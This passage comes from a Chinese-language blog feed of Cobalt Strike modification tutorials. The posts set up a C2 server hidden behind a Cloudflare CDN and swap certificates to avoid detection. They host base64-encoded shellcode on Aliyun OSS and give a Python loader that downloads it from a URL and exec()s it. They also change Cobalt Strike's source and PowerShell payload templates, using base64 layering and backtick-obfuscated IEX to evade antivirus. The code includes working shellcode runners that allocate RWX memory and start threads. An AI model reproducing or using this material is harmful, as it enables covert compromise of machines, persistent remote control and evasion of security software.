&quot;http://www.woaikansese.shop/&quot;;</span><br><span class="line">        header &quot;Accept-Encoding&quot; &quot;gzip, deflate&quot;;       </span><br><span class="line">        id &#123;</span><br><span class="line">            mask;       </span><br><span class="line">            base64url;</span><br><span class="line">            parameter &quot;__cfduid&quot;;            </span><br><span class="line">        &#125;       </span><br><span class="line">        output &#123;</span><br><span class="line">            mask;</span><br><span class="line">            base64url;</span><br><span class="line">            print;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>修改完成后将修改的文件上传的CS的服务端</p><h4 id="6、启动CS加载CS模版，"><a href="#6、启动CS加载CS模版，" class="headerlink" title="6、启动CS加载CS模版，"></a>6、启动CS加载CS模版，</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./teamserver x.x.x.x passwd jquery-c2.4.5.profile</span><br></pre></td></tr></table></figure><p>创建监听器<br><img src="/posts/a28d2b5c/image-20220906092920872.png" alt="image-20220906092920872"><br><strong>注意1：</strong><br>因为cloudflare的原因这里端口的设置需要注意以下：<br>若是http，则只能设置80,8080,8880,2052,2082,2086,2095这些端口号<br>若是https，则只能设置443,2053,2083,2087,2096,8443这些端口号<br><strong>注意2：</strong><br>后门生成使用Stageless模式<br><img src="/posts/a28d2b5c/image-20220906100648532.png" alt="image-20220906100648532"><br>成功上线<br>用火绒剑分析下<br><img src="/posts/a28d2b5c/image-20220906100919331.png" alt="image-20220906100919331"><br><img src="/posts/a28d2b5c/image-20220906100945570.png" alt="image-20220906100945570"><br>ip地址为CDN地址</p><h2 id="防特征审计-SSL证书"><a href="#防特征审计-SSL证书" class="headerlink" title="防特征审计-SSL证书"></a>防特征审计-SSL证书</h2><h4 id="1、配置SSL设置"><a href="#1、配置SSL设置" class="headerlink" title="1、配置SSL设置"></a>1、配置SSL设置</h4><p>创建证书（SSL-源服务器）<br>在cloudflare创建证书<br><img src="/posts/a28d2b5c/image-20220906104458013.png" alt="image-20220906104458013"><br><img src="/posts/a28d2b5c/image-20220906104537158.png" alt="image-20220906104537158"><br>将Origin Certificate保存到本地命名为sever.pem,Private Key保存为sever.key<br><img src="/posts/a28d2b5c/image-20220906104832429.png" alt="image-20220906104832429"><br>设置页面规则(缓存级别-绕过)<br><img src="/posts/a28d2b5c/image-20220906105158083.png" alt="image-20220906105158083"><br><img src="/posts/a28d2b5c/image-20220906105336222.png" alt="image-20220906105336222"><br>url处为域名加上&#x2F;*js</p><h4 id="2、生成证书文件"><a href="#2、生成证书文件" class="headerlink" title="2、生成证书文件"></a>2、生成证书文件</h4><p>把刚才保存的两个文件传到服务器<br>运行下面两条命令注意修改为自己的域名</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">openssl pkcs12 -export -in server.pem -inkey server.key -out www.woaikansese.shop.p12 -name www.woaikansese.shop -passout pass:123456</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">keytool -importkeystore -deststorepass 123456 -destkeypass 123456 -destkeystore www.woaikansese.shop.store -srckeystore www.woaikansese.shop.p12 -srcstoretype PKCS12 -srcstorepass 123456 -alias www.woaikansese.shop</span><br></pre></td></tr></table></figure><p>会生成一个<a href="http://www.woaikansese.shop.store文件/">www.woaikansese.shop.store文件</a></p><h4 id="3、修改teamserver"><a href="#3、修改teamserver" class="headerlink" title="3、修改teamserver"></a>3、修改teamserver</h4><p>证书指向：<a href="http://www.woaikansese.shop.store/">www.woaikansese.shop.store</a><br>修改最后一行</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">原:-Djavax.net.ssl.keyStore=./cobaltstrike.store</span></span><br><span class="line">-Djavax.net.ssl.keyStore=./www.woaikansese.shop.store</span><br></pre></td></tr></table></figure><p>证书密码：123456</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">原:-Djavax.net.ssl.keyStorePassword=Microsoft</span></span><br><span class="line">-Djavax.net.ssl.keyStorePassword=123456</span><br></pre></td></tr></table></figure><h4 id="4、启动teamserver"><a href="#4、启动teamserver" class="headerlink" title="4、启动teamserver"></a>4、启动teamserver</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./teamserver x.x.x.x passwd jquery-c2.4.5.profile</span><br></pre></td></tr></table></figure><p>创建一个https的监听器<br><img src="/posts/a28d2b5c/image-20220906122429149.png" alt="image-20220906122429149"><br>还是使用Stageless模式的马<br>证书特征修改成功 成功上线<br><img src="/posts/a28d2b5c/image-20220906162918608.png" alt="image-20220906162918608"><br><img src="/posts/a28d2b5c/image-20220906163921303.png" alt="image-20220906163921303"></p><h2 id="防流量审计-OSS存储"><a href="#防流量审计-OSS存储" class="headerlink" title="防流量审计-OSS存储"></a>防流量审计-OSS存储</h2><p>把数据放到oss oss域名是一个绿标可能会认为是一下资源在加载杀毒软件会放行<br>产品：阿里云，腾讯云等</p><h4 id="1、开启OSS对象存储"><a href="#1、开启OSS对象存储" class="headerlink" title="1、开启OSS对象存储"></a>1、开启OSS对象存储</h4><p>在阿里云购买OSS服务<a href="https://www.aliyun.com/product/oss">https://www.aliyun.com/product/oss</a></p><h4 id="2、创建Bucket列表"><a href="#2、创建Bucket列表" class="headerlink" title="2、创建Bucket列表"></a>2、创建Bucket列表</h4><p><img src="/posts/a28d2b5c/image-20220906183907524.png" alt="image-20220906183907524"><br>注意读写权限要选择:公共读<br><img src="/posts/a28d2b5c/image-20220906184033570.png" alt="image-20220906184033570"></p><h4 id="3、上传Shellcode文件"><a href="#3、上传Shellcode文件" class="headerlink" title="3、上传Shellcode文件"></a>3、上传Shellcode文件</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> ctypes</span><br><span class="line">shellcode = <span class="string">b&quot;**shellcode**&quot;</span> <span class="comment"># CS生成shellcode32位还是64位根据python位数而定</span></span><br><span class="line"><span class="comment">#64位python加载代码 </span></span><br><span class="line">ctypes.windll.kernel32.VirtualAlloc.restype = ctypes.c_uint64</span><br><span class="line">rwxpage = ctypes.windll.kernel32.VirtualAlloc(<span class="number">0</span>, <span class="built_in">len</span>(shellcode), <span class="number">0x3000</span>, <span class="number">0x40</span>)</span><br><span class="line">ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_uint64(rwxpage), ctypes.create_string_buffer(shellcode), <span class="built_in">len</span>(shellcode))</span><br><span class="line">handle = ctypes.windll.kernel32.CreateThread(<span class="number">0</span>, <span class="number">0</span>, ctypes.c_uint64(rwxpage), <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line">ctypes.windll.kernel32.WaitForSingleObject(handle, -<span class="number">1</span>)</span><br></pre></td></tr></table></figure><p>将上面代码填入shellcode，base64加密后上传到阿里云oss<br><img src="/posts/a28d2b5c/image-20220906185553274.png" alt="image-20220906185553274"><br>注意选择共有读或者 继承 Bucket<br><img src="/posts/a28d2b5c/image-20220906185632114.png" alt="image-20220906185632114"></p><h4 id="4、获取地址-amp-代码加载"><a href="#4、获取地址-amp-代码加载" class="headerlink" title="4、获取地址&amp;代码加载"></a>4、获取地址&amp;代码加载</h4><p>上传完成后点击分析获取链接填入下面上线代码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> ctypes,base64</span><br><span class="line"><span class="keyword">from</span> urllib.request <span class="keyword">import</span> urlopen</span><br><span class="line">myURL = urlopen(<span class="string">&quot;OSS获取到的URL&quot;</span>)</span><br><span class="line">z=myURL.read()</span><br><span class="line">zx=base64.b64decode(z)</span><br><span class="line"><span class="built_in">exec</span>(zx)</span><br></pre></td></tr></table></figure><p><img src="/posts/a28d2b5c/image-20220906185900487.png" alt="image-20220906185900487"></p>]]></content>
      
      
      <categories>
          
          <category> CobaltStrike </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CobaltStrike </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CobaltStrike简单二开学习记录(下)</title>
      <link href="/posts/2f863dad/"/>
      <url>/posts/2f863dad/</url>
      
        <content type="html"><![CDATA[<h1 id="CobaltStrike简单二开学习记录-下"><a href="#CobaltStrike简单二开学习记录-下" class="headerlink" title="CobaltStrike简单二开学习记录(下)"></a>CobaltStrike简单二开学习记录(下)</h1><h2 id="C-x2F-C-–生成-amp-模版修改"><a href="#C-x2F-C-–生成-amp-模版修改" class="headerlink" title="C&#x2F;C++–生成&amp;模版修改"></a>C&#x2F;C++–生成&amp;模版修改</h2><p>直接搜索payload关键字(unsigned char buf[])找到代码<br>payload生成位置:\decompiled_src\encoders\Transforms.java<br>toC函数：<br><img src="/posts/2f863dad/image-20220904155924279.png" alt="image-20220904155924279"><br>老样子复制到src目录下进行修改具体方法见上篇<br>添加base64加密</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="type">byte</span>[] toC(<span class="type">byte</span>[] var0) &#123;</span><br><span class="line"><span class="type">Packer</span> <span class="variable">var1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Packer</span>();</span><br><span class="line">var1.addString(<span class="string">&quot;/* length: &quot;</span> + var0.length + <span class="string">&quot; bytes */\n&quot;</span>);</span><br><span class="line">var1.addString(<span class="string">&quot;unsigned char buf[] = \&quot;&quot;</span> + Base64.encode(CommonUtils.bString(toVeil(var0))) + <span class="string">&quot;\&quot;;\n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> var1.getBytes();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>重新编译<br>替换原来jar包的ransforms.java具体方法见上篇<br>将修改好的jar包替换到服务端和客户端<br>测试:生成一个c的payload</p><p><img src="/posts/2f863dad/image-20220904161045777.png" alt="image-20220904161045777"><br>生成即为base64加密<br>注意后续使用的时候还需要加一个b来转换为byte流数据</p><h2 id="Powershell-生成-amp-模版修改"><a href="#Powershell-生成-amp-模版修改" class="headerlink" title="Powershell-生成&amp;模版修改"></a>Powershell-生成&amp;模版修改</h2><p>默认生成32位powershell payload为</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Set-StrictMode</span> <span class="literal">-Version</span> <span class="number">2</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$DoIt</span> = <span class="string">@&#x27;</span></span><br><span class="line"><span class="string">function func_get_proc_address &#123;</span></span><br><span class="line"><span class="string">Param ($var_module, $var_procedure)</span></span><br><span class="line"><span class="string">$var_unsafe_native_methods = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object &#123; $_.GlobalAssemblyCache -And $_.Location.Split(&#x27;\\&#x27;)[-1].Equals(&#x27;System.dll&#x27;) &#125;).GetType(&#x27;Microsoft.Win32.UnsafeNativeMethods&#x27;)</span></span><br><span class="line"><span class="string">$var_gpa = $var_unsafe_native_methods.GetMethod(&#x27;GetProcAddress&#x27;, [Type[]] @(&#x27;System.Runtime.InteropServices.HandleRef&#x27;, &#x27;string&#x27;))</span></span><br><span class="line"><span class="string">return $var_gpa.Invoke($null, @([System.Runtime.InteropServices.HandleRef](New-Object System.Runtime.InteropServices.HandleRef((New-Object IntPtr), ($var_unsafe_native_methods.GetMethod(&#x27;GetModuleHandle&#x27;)).Invoke($null, @($var_module)))), $var_procedure))</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">function func_get_delegate_type &#123;</span></span><br><span class="line"><span class="string">Param (</span></span><br><span class="line"><span class="string">[Parameter(Position = 0, Mandatory = $True)] [Type[]] $var_parameters,</span></span><br><span class="line"><span class="string">[Parameter(Position = 1)] [Type] $var_return_type = [Void]</span></span><br><span class="line"><span class="string">)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">$var_type_builder = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName(&#x27;ReflectedDelegate&#x27;)), [System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule(&#x27;InMemoryModule&#x27;, $false).DefineType(&#x27;MyDelegateType&#x27;, &#x27;Class, Public, Sealed, AnsiClass, AutoClass&#x27;, [System.MulticastDelegate])</span></span><br><span class="line"><span class="string">$var_type_builder.DefineConstructor(&#x27;RTSpecialName, HideBySig, Public&#x27;, [System.Reflection.CallingConventions]::Standard, $var_parameters).SetImplementationFlags(&#x27;Runtime, Managed&#x27;)</span></span><br><span class="line"><span class="string">$var_type_builder.DefineMethod(&#x27;Invoke&#x27;, &#x27;Public, HideBySig, NewSlot, Virtual&#x27;, $var_return_type, $var_parameters).SetImplementationFlags(&#x27;Runtime, Managed&#x27;)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">return $var_type_builder.CreateType()</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[Byte[]]$var_code = [System.Convert]::FromBase64String(&#x27;%%DATA%%&#x27;)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">for ($x = 0; $x -lt $var_code.Count; $x++) &#123;</span></span><br><span class="line"><span class="string">$var_code[$x] = $var_code[$x] -bxor 35</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">$var_va = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((func_get_proc_address kernel32.dll VirtualAlloc), (func_get_delegate_type @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr])))</span></span><br><span class="line"><span class="string">$var_buffer = $var_va.Invoke([IntPtr]::Zero, $var_code.Length, 0x3000, 0x40)</span></span><br><span class="line"><span class="string">[System.Runtime.InteropServices.Marshal]::Copy($var_code, 0, $var_buffer, $var_code.length)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">$var_runme = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($var_buffer, (func_get_delegate_type @([IntPtr]) ([Void])))</span></span><br><span class="line"><span class="string">$var_runme.Invoke([IntPtr]::Zero)</span></span><br><span class="line"><span class="string">&#x27;@</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">If</span> ([<span class="built_in">Int</span><span class="type">Ptr</span>]::size <span class="operator">-eq</span> <span class="number">8</span>) &#123;</span><br><span class="line"><span class="built_in">start-job</span> &#123; <span class="keyword">param</span>(<span class="variable">$a</span>) <span class="built_in">IEX</span> <span class="variable">$a</span> &#125; <span class="literal">-RunAs32</span> <span class="literal">-Argument</span> <span class="variable">$DoIt</span> | <span class="built_in">wait-job</span> | <span class="built_in">Receive-Job</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line"><span class="built_in">IEX</span> <span class="variable">$DoIt</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上节课的思路是直接将免杀代码替换模板文件但这也就造成了一个问题上线ip和端口和协议已经被写死了无法替换，我们能不能尝试修改生成逻辑达到可以修改相关信息同时达到免杀呢?<br>payload的生成代码位置在:\decompiled_src\common\ResourceUtils.java 可以看到使用<code>%%DATA%%</code>生成传递给模板文件<br>同样是修改模板文件但是这次不能修改<code>%%DATA%%</code> 使CS可以正常传递payload<br>可以采取的思路将原模板分离最后再拼接也就是分为以下三个变量再进行拼接</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Set-StrictMode</span> <span class="literal">-Version</span> <span class="number">2</span></span><br><span class="line"><span class="variable">$x1</span> = <span class="string">@&#x27;</span></span><br><span class="line"><span class="string">function func_get_proc_address &#123;</span></span><br><span class="line"><span class="string">Param ($var_module, $var_procedure)</span></span><br><span class="line"><span class="string">$var_unsafe_native_methods = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object &#123; $_.GlobalAssemblyCache -And $_.Location.Split(&#x27;\\&#x27;)[-1].Equals(&#x27;System.dll&#x27;) &#125;).GetType(&#x27;Microsoft.Win32.UnsafeNativeMethods&#x27;)</span></span><br><span class="line"><span class="string">$var_gpa = $var_unsafe_native_methods.GetMethod(&#x27;GetProcAddress&#x27;, [Type[]] @(&#x27;System.Runtime.InteropServices.HandleRef&#x27;, &#x27;string&#x27;))</span></span><br><span class="line"><span class="string">return $var_gpa.Invoke($null, @([System.Runtime.InteropServices.HandleRef](New-Object System.Runtime.InteropServices.HandleRef((New-Object IntPtr), ($var_unsafe_native_methods.GetMethod(&#x27;GetModuleHandle&#x27;)).Invoke($null, @($var_module)))), $var_procedure))</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">function func_get_delegate_type &#123;</span></span><br><span class="line"><span class="string">Param (</span></span><br><span class="line"><span class="string">[Parameter(Position = 0, Mandatory = $True)] [Type[]] $var_parameters,</span></span><br><span class="line"><span class="string">[Parameter(Position = 1)] [Type] $var_return_type = [Void]</span></span><br><span class="line"><span class="string">)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">$var_type_builder = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName(&#x27;ReflectedDelegate&#x27;)), [System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule(&#x27;InMemoryModule&#x27;, $false).DefineType(&#x27;MyDelegateType&#x27;, &#x27;Class, Public, Sealed, AnsiClass, AutoClass&#x27;, [System.MulticastDelegate])</span></span><br><span class="line"><span class="string">$var_type_builder.DefineConstructor(&#x27;RTSpecialName, HideBySig, Public&#x27;, [System.Reflection.CallingConventions]::Standard, $var_parameters).SetImplementationFlags(&#x27;Runtime, Managed&#x27;)</span></span><br><span class="line"><span class="string">$var_type_builder.DefineMethod(&#x27;Invoke&#x27;, &#x27;Public, HideBySig, NewSlot, Virtual&#x27;, $var_return_type, $var_parameters).SetImplementationFlags(&#x27;Runtime, Managed&#x27;)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">return $var_type_builder.CreateType()</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[Byte[]]$var_code = [System.Convert]::FromBase64String(&#x27;</span></span><br><span class="line"><span class="string">&#x27;@</span></span><br></pre></td></tr></table></figure><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$x2</span>=<span class="string">&#x27;%%DATA%%&#x27;</span></span><br></pre></td></tr></table></figure><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$x3</span> =<span class="string">@&#x27;</span></span><br><span class="line"><span class="string">&#x27;)</span></span><br><span class="line"><span class="string">for ($x = 0; $x -lt $var_code.Count; $x++) &#123;</span></span><br><span class="line"><span class="string">$var_code[$x] = $var_code[$x] -bxor 35</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">$var_va = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((func_get_proc_address kernel32.dll VirtualAlloc), (func_get_delegate_type @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr])))</span></span><br><span class="line"><span class="string">$var_buffer = $var_va.Invoke([IntPtr]::Zero, $var_code.Length, 0x3000, 0x40)</span></span><br><span class="line"><span class="string">[System.Runtime.InteropServices.Marshal]::Copy($var_code, 0, $var_buffer, $var_code.length)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">$var_runme = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($var_buffer, (func_get_delegate_type @([IntPtr]) ([Void])))</span></span><br><span class="line"><span class="string">$var_runme.Invoke([IntPtr]::Zero)</span></span><br><span class="line"><span class="string">&#x27;@</span></span><br></pre></td></tr></table></figure><p>最后拼接执行</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$xx</span>=<span class="variable">$x1</span>+<span class="variable">$x2</span>+<span class="variable">$x3</span></span><br><span class="line"><span class="keyword">If</span> ([<span class="built_in">Int</span><span class="type">Ptr</span>]::size <span class="operator">-eq</span> <span class="number">8</span>) &#123;</span><br><span class="line"><span class="built_in">start-job</span> &#123; <span class="keyword">param</span>(<span class="variable">$a</span>) <span class="built_in">IEX</span> <span class="variable">$a</span> &#125; <span class="literal">-RunAs32</span> <span class="literal">-Argument</span> <span class="variable">$xx</span> | <span class="built_in">wait-job</span> | <span class="built_in">Receive-Job</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line"><span class="built_in">IEX</span> <span class="variable">$xx</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>先把%%DATA%%换成payload进行测试能否正常上线</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell -ExecutionPolicy bypass -File test.ps1</span><br></pre></td></tr></table></figure><p><img src="/posts/2f863dad/image-20220904123821927.png" alt="image-20220904123821927"></p><p>成功上线<br>现在解决了生成问题接下来要解决免杀问题<br>可以对以上三个部分进行base64编码然后解码再进行执行</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Set-StrictMode</span> <span class="literal">-Version</span> <span class="number">2</span></span><br><span class="line"><span class="variable">$x1</span>=<span class="string">&#x27;加密内容&#x27;</span></span><br><span class="line"><span class="variable">$x2</span>=<span class="string">&#x27;加密内容&#x27;</span> <span class="comment">#先用生成的shellcode再次加密 进行测试</span></span><br><span class="line"><span class="variable">$x3</span>=<span class="string">&#x27;加密内容&#x27;</span></span><br><span class="line"><span class="variable">$xx1</span>=[<span class="type">System.Text.Encoding</span>]::UTF8.GetString([<span class="type">System.Convert</span>]::FromBase64String(<span class="variable">$x1</span>))</span><br><span class="line"><span class="variable">$xx2</span>=[<span class="type">System.Text.Encoding</span>]::UTF8.GetString([<span class="type">System.Convert</span>]::FromBase64String(<span class="variable">$x2</span>))</span><br><span class="line"><span class="variable">$xx3</span>=[<span class="type">System.Text.Encoding</span>]::UTF8.GetString([<span class="type">System.Convert</span>]::FromBase64String(<span class="variable">$x3</span>))</span><br><span class="line"><span class="variable">$xxx</span>=<span class="variable">$xx1</span>+<span class="variable">$xx2</span>+<span class="variable">$xx3</span></span><br><span class="line"><span class="keyword">If</span> ([<span class="built_in">Int</span><span class="type">Ptr</span>]::size <span class="operator">-eq</span> <span class="number">8</span>) &#123;</span><br><span class="line"><span class="built_in">start-job</span> &#123; <span class="keyword">param</span>(<span class="variable">$a</span>) IE`X <span class="variable">$a</span> &#125; <span class="literal">-RunAs32</span> <span class="literal">-Argument</span> <span class="variable">$xxx</span> | <span class="built_in">wait-job</span> | <span class="built_in">Receive-Job</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">I`EX <span class="variable">$xxx</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>老样子<code>%%DATA%%</code>换shellcode先测试</p><p><img src="/posts/2f863dad/image-20220904125640429.png" alt="image-20220904125640429"><br>依然可以上线<br><img src="/posts/2f863dad/image-20220904125747999.png" alt="image-20220904125747999"><br>成功免杀火绒<br>测试完成接下来要对CS的源代码做文章打到生成即可免杀<br>$x2位置源码在这里会更加监听器配置进行生成base64 我们需要再次base64加密所以修改源码<br>ResourceUtils.java复制到src&#x2F;common&#x2F;ResourceUtils.java 具体方法看上篇<br>_buildPowerShellNoHint函数</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">byte</span>[] _buildPowerShellNoHint(<span class="type">byte</span>[] var1, String var2) <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">   <span class="type">InputStream</span> <span class="variable">var3</span> <span class="operator">=</span> CommonUtils.resource(<span class="string">&quot;resources/template.&quot;</span> + var2 + <span class="string">&quot;.ps1&quot;</span>);</span><br><span class="line">   <span class="type">byte</span>[] var4 = CommonUtils.readAll(var3);</span><br><span class="line">   var3.close();</span><br><span class="line">   <span class="type">String</span> <span class="variable">var5</span> <span class="operator">=</span> CommonUtils.bString(var4);</span><br><span class="line">   <span class="type">byte</span>[] var6 = <span class="keyword">new</span> <span class="title class_">byte</span>[]&#123;<span class="number">35</span>&#125;;</span><br><span class="line">   var1 = CommonUtils.XorString(var1, var6);</span><br><span class="line">   var5 = CommonUtils.strrep(var5, <span class="string">&quot;%%TEST%%&quot;</span>, Base64.encode(Base64.encode(var1)));</span><br><span class="line">   <span class="keyword">return</span> CommonUtils.toBytes(var5);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>由%%DATA%%改为%%TEST%%在加一个base64<br>修改完成后编译<br>修改模板文件\decompiled_src\resources\template.x86.ps1</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Set-StrictMode</span> <span class="literal">-Version</span> <span class="number">2</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$x1</span>=<span 